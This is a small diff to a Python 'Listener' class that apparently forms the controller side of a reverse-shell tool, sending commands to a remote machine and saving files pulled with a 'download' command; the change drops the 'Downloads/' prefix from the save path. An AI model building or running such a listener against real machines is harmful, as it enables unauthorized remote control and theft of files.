@@ -42,5 +42,5 @@ class Listener:
             command = command.split(" ")
             result = self.execute_remotely(command)
             if command[0] == "download":
-                result = self.write_file("Downloads/" + command[1], result)
+                result = self.write_file(command[1], result)
             print(result)
